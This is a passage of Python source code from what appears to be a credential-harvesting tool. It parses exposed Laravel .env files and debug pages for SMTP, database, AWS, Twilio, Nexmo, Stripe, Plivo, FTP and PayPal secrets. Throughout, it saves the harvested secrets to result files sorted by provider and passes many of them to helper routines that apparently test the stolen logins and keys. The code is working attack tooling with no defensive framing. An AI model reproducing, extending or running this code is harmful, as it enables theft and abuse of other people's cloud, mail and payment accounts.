                    port = re.findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    user = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(str(urlku) + '|' + str(host) + '|' + str(port) + '|' + str(user) + '|' + str(pw))
                        # with open('Result(method2)/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result(method2)/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '.sendgrid.net' in host:
                            with open('Result(method2)/SMTP/sendgrid.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '.office365.com' in host:
                            with open('Result(method2)/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '.mailgun.' in host:
                            with open('Result(method2)/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '.mailtrap.io' in host:
                            with open('Result(method2)/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            # smtp_login(teks,'debug',host,port,user,pw)
                        elif '.zoho.' in host:
                            with open('Result(method2)/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '1and1' in host:
                            with open('Result(method2)/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        elif '.amazonaws.' in host:
                            open('Result(method2)/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        else:
                            with open('Result(method2)/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login2(teks, 'debug', host, port, user, pw)
                        oke += 1
                except:
                    pass
            if 'SMTP_HOST' in teks:
                try:
                    host = re.findall('<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    user = re.findall('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                        # with open('Result(method2)/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        # return True
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result(method2)/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.sendgrid.net' in host:
                            with open('Result(method2)/SMTP/sendgrid.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.office365.com' in host:
                            with open('Result(method2)/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.mailgun.' in host:
                            with open('Result(method2)/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.mailtrap.io' in host:
                            with open('Result(method2)/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.zoho.' in host:
                            with open('Result(method2)/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '1and1' in host:
                            with open('Result(method2)/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        else:
                            with open('Result(method2)/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        oke += 1
                except:
                    pass
            if oke == 0:
                return False
            else:
                return oke
        else:
            return False

    def get_database(self, method, urlku, teks):
        if method == 'env':
            if 'DB_HOST=' in teks:
                try:
                    try:
                        host = re.findall('DB_HOST=(.*?)\n', teks)[0]
                    except:
                        host = re.findall('DB_SERVER=(.*?)\n', teks)[0]
                    if host.startswith('"') and host.endswith('"'):
                        host = host.replace('"', '')
                    else:
                        pass
                    if '\r' in host:
                        host = host.replace('\r', '')
                    else:
                        pass
                    port = re.findall('DB_PORT=(.*?)\n', teks)[0]
                    if port.startswith('"') and port.endswith('"'):
                        port = port.replace('"', '')
                    else:
                        pass
                    if '\r' in port:
                        port = port.replace('\r', '')
                    else:
                        pass
                    db = re.findall('DB_DATABASE=(.*?)\n', teks)[0]
                    if db.startswith('"') and db.endswith('"'):
                        db = db.replace('"', '')
                    else:
                        pass
                    if '\r' in db:
                        db = db.replace('\r', '')
                    else:
                        pass
                    try:
                        user = re.findall('DB_USERNAME=(.*?)\n', teks)[0]
                    except:
                        user = re.findall('DB_USER=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    else:
                        pass
                    pw = re.findall('DB_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    else:
                        pass
                    if host == 'null' or host == '""' or host == '' or '****' in host or pw == "" or "$_SERVER" in host:
                        return False
                    else:
                        satu = clean(urlku + '|' + host + "|" + port + "|" + db + "|" + user + "|" + pw)
                        with open('Result(method2)/database.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'DB_MYSQL_HOST=' in teks:
                try:
                    try:
                        host = re.findall('DB_MYSQL_HOST=(.*?)\n', teks)[0]
                    except:
                        host = re.findall('DB_MYSQL_SERVER=(.*?)\n', teks)[0]
                    if host.startswith('"') and host.endswith('"'):
                        host = host.replace('"', '')
                    else:
                        pass
                    if '\r' in host:
                        host = host.replace('\r', '')
                    else:
                        pass
                    port = re.findall('DB_MYSQL_PORT=(.*?)\n', teks)[0]
                    if port.startswith('"') and port.endswith('"'):
                        port = port.replace('"', '')
                    else:
                        pass
                    if '\r' in port:
                        port = port.replace('\r', '')
                    else:
                        pass
                    db = re.findall('DB_MYSQL_DATABASE=(.*?)\n', teks)[0]
                    if db.startswith('"') and db.endswith('"'):
                        db = db.replace('"', '')
                    else:
                        pass
                    if '\r' in db:
                        db = db.replace('\r', '')
                    else:
                        pass
                    try:
                        user = re.findall('DB_MYSQL_USERNAME=(.*?)\n', teks)[0]
                    except:
                        user = re.findall('DB_MYSQL_USER=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    else:
                        pass
                    pw = re.findall('DB_MYSQL_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    else:
                        pass
                    if host == 'null' or host == '""' or host == '' or '****' in host or pw == "":
                        return False
                    else:
                        satu = clean(urlku + '|' + host + "|" + port + "|" + db + "|" + user + "|" + pw)
                        with open('Result(method2)/database.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'DB_HOST' in teks:
                try:
                    try:
                        host = re.findall('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    except:
                        host = re.findall('<td>DB_HOST_READ<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    db = re.findall('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in db:
                        db = db.replace('\r', '')
                    user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '*****' in host or pw == "":
                        return False
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + db + '|' + user + '|' + pw)
                        with open('Result(method2)/database.txt', 'a') as tulis:
                            tulis.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'DB_MYSQL_HOST' in teks:
                try:
                    host = re.findall('<td>DB_MYSQL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('<td>DB_MYSQL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    db = re.findall('<td>DB_MYSQL_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in db:
                        db = db.replace('\r', '')
                    user = re.findall('<td>DB_MYSQL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>DB_MYSQL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '*****' in host or pw == "":
                        return False
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + db + '|' + user + '|' + pw)
                        with open('Result(method2)/database.txt', 'a') as tulis:
                            tulis.write(satu + '\n')
                        return True
                except:
                    return False

    def get_aws(self, method, urlku, teks):
        objek = 0
        if method == 'env':
            if 'AWS_ACCESS_KEY_ID=' in teks:
                try:
                    key = re.findall('AWS_ACCESS_KEY_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    else:
                        pass
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    else:
                        pass
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'")
                    else:
                        pass
                    if " " in key:
                        key = key.replace(' ', '')
                    else:
                        pass
                    sec = re.findall('AWS_SECRET_ACCESS_KEY=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    else:
                        pass
                    if sec.startswith('"') and sec.endswith('"'):
                        sec = sec.replace('"', '')
                    else:
                        pass
                    if sec.startswith("'") and sec.endswith("'"):
                        sec = sec.replace("'", '')
                    else:
                        pass
                    try:
                        region = re.findall('AWS_DEFAULT_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        else:
                            pass
                        if region.startswith('"') and region.endswith('"'):
                            region = region.replace('"', '')
                        else:
                            pass
                        if region.startswith("'") and region.endswith("'"):
                            region = region.replace("'", '')
                        else:
                            pass
                        if " " in region:
                            region = region.replace(" ", '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                        else:
                            pass
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                        pass
                    else:
                        asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
                        # print(asu)
                        objek += 1
                except:
                    pass
            if 'AWS_ACCESS_KEY_ID_S3=' in teks:
                try:
                    key = re.findall('AWS_ACCESS_KEY_ID_S3=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('AWS_SECRET_ACCESS_KEY_S3=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('AWS_DEFAULT_REGION_S3=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if "AWS_KEY=" in teks:
                try:
                    key = re.findall('AWS_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('AWS_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('AWS_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if 'SES_KEY=' in teks:
                try:
                    key = re.findall('SES_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('SES_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('SES_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if 'S3_KEY=' in teks:
                try:
                    key = re.findall('S3_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('S3_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('S3_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if 'AWS_S3_KEY=' in teks:
                try:
                    key = re.findall('AWS_S3_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('AWS_S3_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('AWS_S3_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek
        elif method == 'debug':
            if 'AWS_ACCESS_KEY_ID' in teks:
                try:
                    key = re.findall('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key or sec == '*****' or sec == '':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if "AWS_KEY" in teks:
                try:
                    key = re.findall('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if "S3_KEY" in teks:
                try:
                    key = re.findall('<td>S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>S3_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if "AWS_S3_KEY" in teks:
                try:
                    key = re.findall('<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    try:
                        region = re.findall('<td>AWS_S3_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                        if region == '' or region == '""' or region == 'null' or region == '***':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or '****' in key:
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        with open('Result(method2)/aws.txt', 'a') as ppp:
                            ppp.write(asu + '\n')
                        ceker_aws2(urlku, key, sec, region)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek
        else:
            return False

    def get_twilio(self, method, urlku, teks):
        objek = 0
        if method == 'env':
            if 'TWILIO_SID=' in teks:
                try:
                    sid = re.findall('TWILIO_SID=(.*?)\n', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('TWILIO_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""':
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result(method2)/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        legiontwilio2(sid, token)
                        objek += 1
                except:
                    pass
            if 'TWILIO_ACCOUNT_SID=' in teks:
                try:
                    sid = re.findall('TWILIO_ACCOUNT_SID=(.*?)\n', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('TWILIO_AUTH_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result(method2)/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        legiontwilio2(sid, token)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return True
        elif method == 'debug':
            if 'TWILIO_SID' in teks:
                try:
                    sid = re.findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result(method2)/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        legiontwilio2(sid, token)
                        objek += 1
                except:
                    pass
            if 'TWILIO_ACCOUNT_SID' in teks:
                try:
                    sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sid:
                        sid = sid.replace('\r', '')
                    token = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in token:
                        token = token.replace('\r', '')
                    if sid == '' or sid == 'null' or sid == '""' or '****' in sid:
                        pass
                    else:
                        pack = clean(urlku + '|' + sid + '|' + token)
                        with open('Result(method2)/twilio.txt', 'a') as epep:
                            epep.write(pack + '\n')
                        legiontwilio2(sid, token)
                        objek += 1
                except:
                    pass
            if objek == 0:
                return False
            else:
                return objek

    def get_nexmo(self, method, urlku, teks):
        if method == 'env':
            if 'NEXMO_KEY=' in teks:
                try:
                    key = re.findall('NEXMO_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('NEXMO_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo2(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result(method2)/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'NEXMO_API_KEY=' in teks:
                try:
                    key = re.findall('NEXMO_API_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('NEXMO_API_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo2(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result(method2)/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'NEXMO_KEY' in teks:
                try:
                    key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '******':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo2(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result(method2)/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            elif 'NEXMO_API_KEY' in teks:
                try:
                    key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '******':
                        return False
                    else:
                        satu = clean(urlku + '|' + str(key) + "|" + str(sec))
                        login_nexmo2(urlku, satu.split('|')[1], satu.split('|')[2])
                        with open('Result(method2)/nexmo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_stripe(self, method, urlku, teks):
        if method == 'env':
            if 'STRIPE_KEY=' in teks:
                try:
                    key = re.findall('STRIPE_KEY=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('STRIPE_SECRET=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '':
                        return False
                    else:
                        satu = clean(urlku + '|' + key + "|" + sec)
                        with open('Result(method2)/stripe.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'STRIPE_KEY' in teks:
                try:
                    key = re.findall('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    sec = re.findall('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if key == '""' or key == 'null' or key == '' or key == '*****':
                        return False
                    else:
                        satu = clean(urlku + '|' + key + "|" + sec)
                        with open('Result(method2)/stripe.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_plivo(self, method, urlku, teks):
        if method == 'env':
            if "PLIVO_AUTH_ID=" in teks:
                try:
                    key = re.findall('PLIVO_AUTH_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('PLIVO_AUTH_TOKEN=(.*?)\n', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or key == '""':
                        pass
                    else:
                        satu = clean(urlku + '|' + key + "|" + secret)
                        with open('Result(method2)/plivo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if "PLIVO_AUTH_ID" in teks:
                try:
                    key = re.findall('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or key == '""' or '****' in key:
                        pass
                    else:
                        satu = clean(urlku + '|' + key + "|" + secret)
                        with open('Result(method2)/plivo.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        else:
            return False

    def get_ftp(self, method, urlku, teks):
        if method == 'env':
            if 'FTP_HOST=' in teks:
                try:
                    host = re.findall('FTP_HOST=(.*?)\n', teks)[0]
                    user = re.findall('FTP_USERNAME=(.*?)\n', teks)[0]
                    passwd = re.findall('FTP_PASSWORD=(.*?)\n', teks)[0]
                    if host == '' or host == 'null' or host == '""':
                        pass
                    else:
                        satu = clean('ftp://' + str(host) + "|" + str(user) + '|' + str(passwd))
                        with open('Result(method2)/ftp.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'FTP_HOST' in teks:
                try:
                    host = re.findall('<td>FTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    user = re.findall('<td>FTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    passwd = re.findall('<td>FTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if host == '' or host == 'null' or host == '""' or '****' in host:
                        pass
                    else:
                        satu = clean('ftp://' + str(host) + "|" + str(user) + '|' + str(passwd))
                        with open('Result(method2)/ftp.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        return True
                except:
                    return False
            else:
                return False

    def get_paypal(self, method, urlku, teks):
        f_tp = 0
        if method == 'env':
            if 'PAYPAL_CLIENT_ID=' in teks:
                try:
                    key = re.findall('PAYPAL_CLIENT_ID=(.*?)\n', teks)[0]
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    else:
                        pass
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    else:
                        pass
                    if '\r' in key:
                        key.replace('\r', '')
                    else:
